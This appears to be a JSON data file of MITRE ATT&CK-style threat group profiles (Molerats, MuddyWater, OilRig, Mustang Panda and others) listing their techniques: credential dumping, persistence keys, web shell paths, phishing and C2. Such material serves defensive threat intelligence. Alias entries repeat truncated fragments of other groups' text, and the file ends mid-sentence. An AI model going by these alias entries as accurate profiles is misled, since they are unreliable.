    "Molerats": "Molerats is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States., , , Molerats saved malicious files within the AppData and Startup folders to maintain persistence., Molerats used PowerShell implants on target machines., Molerats used various implants, including those built with VBScript, on target machines., Molerats used various implants, including those built with JS, on target machines. , Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims., Molerats decompresses ZIP files once on the victim machine., Molerats used executables to download malicious files from different sources. , Molerats has delivered compressed executables within ZIP files to victims., Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments., Molerats has sent phishing emails with malicious links included., Molerats actors obtained a list of active processes on the victim and sent them to C2 servers., Molerats has created scheduled tasks to persistently run VBScripts., Molerats has used forged Microsoft code-signing certificates on malware., Molerats has used msiexec.exe to execute an MSI payload. , Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable. , Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.",
    "Moonstone Sleet": "Moonstone Sleet is a North Korean-linked threat actor executing both financially motivated attacks and espionage operations. The group previously overlapped significantly with another North Korean-linked entity, Lazarus Group, but has differentiated its tradecraft since 2023. Moonstone Sleet is notable for creating fake companies and personas to interact with victim entities, as well as developing unique malware such as a variant delivered via a fully functioning game., , Moonstone Sleet registered domains to develop effective personas for fake companies used in phishing activity., Moonstone Sleet registered virtual private servers to host payloads for download., Moonstone Sleet used curl to connect to adversary-controlled infrastructure and retrieve additional payloads., Moonstone Sleet used registry run keys for process execution during initial victim infection., Moonstone Sleet deployed malware such as YouieLoader capable of capturing victim system browser information., Moonstone Sleet has deployed ransomware in victim environments., Moonstone Sleet delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis., Moonstone Sleet developed malicious npm packages for delivery to or retrieval by victims., Moonstone Sleet has developed custom malware, including a malware delivery mechanism masquerading as a legitimate game., Moonstone Sleet has created social media accounts to interact with victims., Moonstone Sleet has created email accounts to interact with victims, including for phishing purposes., Moonstone Sleet gathered victim email address information for follow-on phishing activity., Moonstone Sleet has gathered information on victim organizations through email and social media interaction., Moonstone Sleet retrieved a final stage payload from command and control infrastructure during initial installation on victim systems., Moonstone Sleet delivers encrypted payloads in pieces that are then combined together to form a new portable executable (PE) file during installation., Moonstone Sleet embedded payloads in trojanized software for follow-on execution., Moonstone Sleet has used encrypted payloads within files for follow-on execution and defense evasion., Moonstone Sleet retrieved credentials from LSASS memory., Moonstone Sleet delivered various payloads to victims as spearphishing attachments., Moonstone Sleet has used social media services to spear phish victims to deliver trojainized software., Moonstone Sleet has interacted with victims to gather information via email., Moonstone Sleet used spearphishing messages containing items such as tracking pixels to determine if users interacted with malicious messages., Moonstone Sleet used scheduled tasks for program execution during initial access to victim machines., Moonstone Sleet staged malicious capabilities online for follow-on download by victims or malware., Moonstone Sleet has distributed a trojanized version of PuTTY software for initial access to victims., Moonstone Sleet has gathered information on victim systems., Moonstone Sleet has gathered information on victim network configuration., Moonstone Sleet deployed various malware such as YouieLoader that can perform system user discovery actions., Moonstone Sleet used intermediate loader malware such as YouieLoader and SplitLoader that create malicious services., Moonstone Sleet relied on users interacting with malicious files, such as a trojanized PuTTY installer, for initial execution.",
    "Moses Staff": "Moses Staff is a suspected Iranian threat group that has primarily targeted Israeli companies since at least September 2021. Moses Staff openly stated their motivation in attacking Israeli companies is to cause damage by leaking stolen sensitive data and encrypting the victim's networks without a ransom demand. , Security researchers assess Moses Staff is politically motivated, and has targeted government, finance, travel, energy, manufacturing, and utility companies outside of Israel as well, including those in Italy, India, Germany, Chile, Turkey, the UAE, and the US., , , Moses Staff has collected the administrator username from a compromised host., Moses Staff has built malware, such as DCSrv and PyDCrypt, for targeting victims' machines., Moses Staff has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers., Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines., Moses Staff has downloaded and installed web shells to following path C:/inetpub/wwwroot/aspnet_client/system_web/IISpool.aspx., Moses Staff has used obfuscated web shells in their operations., Moses Staff has used the commercial tool DiskCryptor., Moses Staff has used batch scripts that can enable SMB on a compromised host., Moses Staff has dropped a web shell onto a compromised system., Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection., Moses Staff collected information about the infected host, including the machine names and OS architecture., Moses Staff has collected the domain name of a compromised network.",
    "DEV-0500": "Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines., Moses Staff has downloaded and installed web shells to following path C:/inetpub/wwwroot/aspnet_client/system_web/IISpool.aspx., Moses Staff has used obfuscated web shells in their operations., Moses Staff has used the commercial tool DiskCryptor., Moses Staff has used batch scripts that can enable SMB on a compromised host., Moses Staff has dropped a web shell onto a compromised system., Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection., Moses Staff collected information about the infected host, including the machine names and OS architecture., Moses Staff has collected the domain name of a compromised network.",
    "MoustachedBouncer": "https://attack.mitre.org/groups/G1019/",
    "MuddyWater": "MuddyWater is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS). Since at least 2017, MuddyWater has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America., , , , , , , , MuddyWater uses various techniques to bypass UAC., MuddyWater has used cmd.exe net user /domain to enumerate domain users., MuddyWater has used file sharing services including OneHub, Sync, and TeraBox to distribute tools., MuddyWater has used HTTP for C2 communications., MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded., MuddyWater has added Registry Run key KCU/Software/Microsoft/Windows/CurrentVersion/Run/SystemTextEncoding to establish persistence., MuddyWater has used PowerShell for execution., MuddyWater has used a custom tool for creating reverse shells., MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros., MuddyWater has developed tools in Python including Out1., MuddyWater has used JavaScript files to execute its POWERSTATS payload., MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email., MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers., MuddyWater has used tools to encode C2 communications including Base64 encoding., MuddyWater has stored a decoy PDF file within a victim's %temp% folder., MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript., MuddyWater has used AES to encrypt C2 responses., MuddyWater has used C2 infrastructure to receive exfiltrated data., MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688)., MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution., MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472)., MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords 'Kasper,' 'Panda,' or 'ESET.', MuddyWater maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware., MuddyWater can disable the system's local proxy settings., MuddyWater has used malware that can upload additional files to the victim’s machine., MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook., MuddyWater has used malware that can execute PowerShell scripts via DDE., MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender., MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. , MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg., MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code., MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands., MuddyWater has used legitimate tools ConnectWise, RemoteUtilities, and SimpleHelp to gain access to the target environment., MuddyWater has used a Word Template, Normal.dotm, for persistence., MuddyWater has performed credential dumping with Mimikatz and procdump64.exe., MuddyWater has performed credential dumping with LaZagne., MuddyWater has performed credential dumping with LaZagne., MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients. , MuddyWater has sent targeted spearphishing e-mails with malicious links., MuddyWater has used malware to obtain a list of running processes on the system., MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2)., MuddyWater has used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally., MuddyWater has used scheduled tasks to establish persistence., MuddyWater has used malware that can capture screenshots of the victim’s machine., MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine., MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers., MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload., MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution., MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll., MuddyWater has used malware that can collect the victim’s OS version and machine name., MuddyWater has used malware to collect the victim’s IP address and domain name., MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine., MuddyWater has used malware that can collect the victim’s username., MuddyWater has run a tool that steals passwords saved in victim email., MuddyWater has distributed URLs in phishing e-mails that link to lure documents., MuddyWater has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails. , MuddyWater has used web services including OneHub to distribute remote access tools., MuddyWater has used malware that leveraged WMI for execution and querying host information.",
    "Earth Vetala": " MuddyWater uses various techniques to bypass UAC., MuddyWater has used cmd.exe net user /domain to enumerate domain users., MuddyWater has used file sharing services including OneHub, Sync, and TeraBox to distribute tools., MuddyWater has used HTTP for C2 communications., MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded., MuddyWater has added Registry Run key KCU/Software/Microsoft/Windows/CurrentVersion/Run/SystemTextEncoding to establish persistence., MuddyWater has used PowerShell for execution., MuddyWater has used a custom tool for creating reverse shells., MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros., MuddyWater has developed tools in Python including Out1., MuddyWater has used JavaScript files to execute its POWERSTATS payload., MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email., MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers., MuddyWater has used tools to encode C2 communications including Base64 encoding., MuddyWater has stored a decoy PDF file within a victim's %temp% folder., MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript., MuddyWater has used AES to encrypt C2 responses., MuddyWater has used C2 infrastructure to receive exfiltrated data., MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).",
    "MERCURY": "MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook., MuddyWater has used malware that can execute PowerShell scripts via DDE., MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender., MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. , MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg., MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code., MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands., MuddyWater has used legitimate tools ConnectWise, RemoteUtilities, and SimpleHelp to gain access to the target environment., MuddyWater has used a Word Template, Normal.dotm, for persistence., MuddyWater has performed credential dumping with Mimikatz and procdump64.exe., MuddyWater has performed credential dumping with LaZagne., MuddyWater has performed credential dumping with LaZagne., MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients. , MuddyWater has sent targeted spearphishing e-mails with malicious links., MuddyWater has used malware to obtain a list of running processes on the system., MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2)., MuddyWater has used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally., MuddyWater has used scheduled tasks to establish persistence.",
    "Static Kitten": "MuddyWater has used malware to obtain a list of running processes on the system., MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2)., MuddyWater has used legitimate applications ScreenConnect, AteraAgent and SimpleHelp to manage systems remotely and move laterally., MuddyWater has used scheduled tasks to establish persistence., MuddyWater has used malware that can capture screenshots of the victim’s machine., MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine., MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers., MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload., MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution., MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll., MuddyWater has used malware that can collect the victim’s OS version and machine name., MuddyWater has used malware to collect the victim’s IP address and domain name., MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine., MuddyWater has used malware that can collect the victim’s username., MuddyWater has run a tool that steals passwords saved in victim email., MuddyWater has distributed URLs in phishing e-mails that link to lure documents., MuddyWater has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.",
    "Seedworm": "MuddyWater has used web services including OneHub to distribute remote access tools., MuddyWater has used malware that leveraged WMI for execution and querying host information.",
    "Mustang Panda": "Mustang Panda is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. Mustang Panda has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others. , , , , Mustang Panda have acquired C2 domains prior to operations., Mustang Panda has communicated with its C2 via HTTP POST requests., Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration., Mustang Panda has encrypted documents with RC4 prior to exfiltration., Mustang Panda used custom batch scripts to collect files automatically from a targeted system., Mustang Panda has created the registry key HKEY_LOCAL_MACHINE/SOFTWARE/Wow6432Node/Microsoft/Windows/CurrentVersion/Run/AdobelmdyU to maintain persistence., Mustang Panda has used malicious PowerShell scripts to enable execution., Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection., Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection., Mustang Panda has stored collected credential files in c:/windows/temp prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives., Mustang Panda has encrypted C2 communications with RC4., Mustang Panda has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns., Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence., Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks., Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code., Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files., Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data., Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file., Mustang Panda will delete their tools and files, and kill processes after their objectives are reached., Mustang Panda has downloaded additional executables following the initial infection stage., Mustang Panda has used names like adobeupdate.dat and PotPlayerDB.dat to disguise PlugX, and a file named OneDrive.exe to load a Cobalt Strike payload., Mustang Panda has used an additional filename extension to hide the true file type., Mustang Panda has delivered initial payloads hidden using archives and encoding measures., Mustang Panda has used junk code within their DLL files to hinder analysis., Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file., Mustang Panda has used spearphishing attachments to deliver initial access payloads., Mustang Panda has delivered malicious links to their intended targets., Mustang Panda has delivered web bugs to profile their intended targets., Mustang Panda has used tasklist /v to determine active process information. , Mustang Panda has installed TeamViewer on targeted systems., Mustang Panda has used a customized PlugX variant which could spread through USB connections., Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence., Mustang Panda has searched the victim system for the InstallUtil.exe program and its version., Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims., Mustang Panda has hosted malicious payloads on DropBox including PlugX., Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager., Mustang Panda has used mshta.exe to launch collection scripts., Mustang Panda has gathered system information using systeminfo., Mustang Panda has used ipconfig and arp to determine network configuration information., Mustang Panda has used netstat -ano to determine network connection information., Mustang Panda has sent malicious links including links directing victims to a Google Drive folder., Mustang Panda has sent malicious files requiring direct victim interaction to execute., Mustang Panda has used DropBox URLs to deliver variants of PlugX., Mustang Panda has executed PowerShell scripts via WMI.",
    "TA416": "Mustang Panda have acquired C2 domains prior to operations., Mustang Panda has communicated with its C2 via HTTP POST requests., Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration., Mustang Panda has encrypted documents with RC4 prior to exfiltration., Mustang Panda used custom batch scripts to collect files automatically from a targeted system., Mustang Panda has created the registry key HKEY_LOCAL_MACHINE/SOFTWARE/Wow6432Node/Microsoft/Windows/CurrentVersion/Run/AdobelmdyU to maintain persistence., Mustang Panda has used malicious PowerShell scripts to enable execution., Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection., Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection., Mustang Panda has stored collected credential files in c:/windows/temp prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives., Mustang Panda has encrypted C2 communications with RC4., Mustang Panda has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.",
    "RedDelta": "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence., Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks., Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code., Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files., Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data., Mustang Panda has used a legitimately signed executable to execute a malicious payload within a DLL file., Mustang Panda will delete their tools and files, and kill processes after their objectives are reached., Mustang Panda has downloaded additional executables following the initial infection stage., Mustang Panda has used names like adobeupdate.dat and PotPlayerDB.dat to disguise PlugX, and a file named OneDrive.exe to load a Cobalt Strike payload., Mustang Panda has used an additional filename extension to hide the true file type., Mustang Panda has delivered initial payloads hidden using archives and encoding measures., Mustang Panda has used junk code within their DLL files to hinder analysis., Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file.",
    "BRONZE PRESIDENT": "Mustang Panda has used a customized PlugX variant which could spread through USB connections., Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence., Mustang Panda has searched the victim system for the InstallUtil.exe program and its version., Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims., Mustang Panda has hosted malicious payloads on DropBox including PlugX., Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager., Mustang Panda has used mshta.exe to launch collection scripts., Mustang Panda has gathered system information using systeminfo., Mustang Panda has used ipconfig and arp to determine network configuration information., Mustang Panda has used netstat -ano to determine network connection information., Mustang Panda has sent malicious links including links directing victims to a Google Drive folder., Mustang Panda has sent malicious files requiring direct victim interaction to execute., Mustang Panda has used DropBox URLs to deliver variants of PlugX., Mustang Panda has executed PowerShell scripts via WMI.",
    "Mustard Tempest": "Mustard Tempest is an initial access broker that has operated the SocGholish distribution network since at least 2017. Mustard Tempest has partnered with Indrik Spider to provide access for the download of additional malware including LockBit, WastedLocker, and remote access tools., , , , , Mustard Tempest has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months., Mustard Tempest has posted false advertisements including for software packages and browser updates in order to distribute malware., Mustard Tempest operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page., Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure., Mustard Tempest has deployed secondary payloads and third stage implants to compromised hosts., Mustard Tempest has used the filename AutoUpdater.js to mimic legitimate update files and has also used the Cyrillic homoglyph characters С (0xd0a1) and а (0xd0b0), to produce the filename Сhrome.Updаte.zip., Mustard Tempest has sent victims emails containing links to compromised websites., Mustard Tempest has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months., Mustard Tempest has injected malicious JavaScript into compromised websites to infect victims via drive-by download., Mustard Tempest has poisoned search engine results to return fake software updates in order to distribute malware., Mustard Tempest has used implants to perform system reconnaissance on targeted systems., Mustard Tempest has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.",
    "DEV-0206": "Mustard Tempest has acquired servers to host second-stage payloads that remain active for a period of either days, weeks, or months., Mustard Tempest has posted false advertisements including for software packages and browser updates in order to distribute malware., Mustard Tempest operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page., Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure., Mustard Tempest has deployed secondary payloads and third stage implants to compromised hosts., Mustard Tempest has used the filename AutoUpdater.js to mimic legitimate update files and has also used the Cyrillic homoglyph characters С (0xd0a1) and а (0xd0b0), to produce the filename Сhrome.Updаte.zip.",
    "Naikon": "Naikon is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020). Active since at least 2010, Naikon has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN). , While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches., Naikon has modified a victim's Windows Run registry to establish persistence., Naikon has used DLL side-loading to load malicious DLL's into legitimate executables., Naikon renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager., Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables., Naikon has used the LadonGo scanner to scan target networks., Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host., Naikon has used malicious e-mail attachments to deliver malware., Naikon has used a netbios scanner for remote machine identification., Naikon has used schtasks.exe for lateral movement in compromised networks., Naikon uses commands such as netsh advfirewall firewall to discover local firewall settings., Naikon uses commands such as netsh interface show to discover network interface settings., Naikon has convinced victims to open malicious attachments to execute malware., Naikon has used administrator credentials for lateral movement in compromised networks., Naikon has used WMIC.exe for lateral movement.",
    "NEODYMIUM": "NEODYMIUM is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called PROMETHIUM due to overlapping victim and campaign characteristics.   NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified.",
    "Nomadic Octopus": "Nomadic Octopus is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. Nomadic Octopus has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants., , Nomadic Octopus has used PowerShell for execution. , Nomadic Octopus used cmd.exe /c within a malicious macro., Nomadic Octopus executed PowerShell in a hidden window. , Nomadic Octopus has used malicious macros to download additional files to the victim's machine. , Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface., Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments., Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails.",
    "OilRig": "OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. The group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests., , , This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity., , , , , , OilRig has run net user, net user /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to get account listings on a victim., OilRig has run net user, net user /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to get account listings on a victim., OilRig has used HTTP for C2., OilRig has used DNS for C2 including the publicly available requestbin.net tunneling service., OilRig has used automated collection., OilRig has used brute force techniques to obtain credentials., OilRig has used various types of scripting for execution., OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents., OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts., OilRig has used VBScript macros for execution on compromised hosts., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers., OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager., A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims., OilRig used the Plink utility and other tools to create tunnels to C2 servers., OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS., OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment., OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP., OilRig has deleted files associated with their payload after execution., OilRig can download remote files onto victims., OilRig has used keylogging tools called KEYPUNCH and LONGWATCH. , OilRig has used .doc file extensions to mask malicious executables., OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning., OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion., OilRig has encrypted and encoded data in its malware, including by using base64., OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse., OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used net.exe in a script with net accounts /domain to find the password policy of a domain., OilRig has used tools to identify if a mouse is connected to a targeted system., OilRig has used net localgroup administrators to find local administrators on compromised systems., OilRig has used net group /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to find domain group permission settings., OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts., OilRig has sent spearphising emails with malicious links to potential victims., OilRig has used LinkedIn to send spearphishing links., OilRig has run tasklist on a victim's machine., OilRig has used the Plink utility and other tools to create tunnels to C2 servers., OilRig has used reg query 'HKEY_CURRENT_USER/Software/Microsoft/Terminal Server Client/Default' on a victim to query the Registry., OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment., OilRig has used Putty to access compromised systems., OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines., OilRig has a tool called CANDYKING to capture a screenshot of user's desktop., OilRig has used web shells, often to maintain access to a victim network., OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim., OilRig has run hostname and systeminfo on a victim. , OilRig has run ipconfig /all on a victim., OilRig has used netstat -an on a victim to get a listing of network connections., OilRig has run whoami on a victim., OilRig has used sc query on a victim to gather information about services., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has delivered malicious links to achieve execution on the target system., OilRig has delivered macro-enabled documents that required targets to click the 'enable content' button to execute the payload on the system., OilRig has used compromised credentials to access other systems on a victim network., OilRig has used macros to verify if a mouse is connected to a compromised machine., OilRig has used WMI for execution., OilRig has been seen utilizing watering hole attacks to collect credentials which could be used to gain access into ICS networks. , OilRig has embedded a macro within spearphishing attachments that has been made up of both a VBScript and a PowerShell script., OilRig used spearphishing emails with malicious Microsoft Excel spreadsheet attachments. , OilRig communicated with its command and control using HTTP requests. , OilRig utilized stolen credentials to gain access to victim machines.",
    "COBALT GYPSY": "This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity., , , , , , OilRig has run net user, net user /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to get account listings on a victim., OilRig has run net user, net user /domain, net group 'domain admins' /domain, and net group 'Exchange Trusted Subsystem' /domain to get account listings on a victim., OilRig has used HTTP for C2., OilRig has used DNS for C2 including the publicly available requestbin.net tunneling service., OilRig has used automated collection., OilRig has used brute force techniques to obtain credentials., OilRig has used various types of scripting for execution., OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents., OilRig has used macros to deliver malware such as QUADAGENT and OopsIE. OilRig has used batch scripts., OilRig has used VBScript macros for execution on compromised hosts., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers., OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager., A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims., OilRig used the Plink utility and other tools to create tunnels to C2 servers.",
    "IRN2": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access., OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers., OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager., A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims., OilRig used the Plink utility and other tools to create tunnels to C2 servers., OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS., OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment., OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP., OilRig has deleted files associated with their payload after execution., OilRig can download remote files onto victims., OilRig has used keylogging tools called KEYPUNCH and LONGWATCH. , OilRig has used .doc file extensions to mask malicious executables., OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning., OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion., OilRig has encrypted and encoded data in its malware, including by using base64., OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page 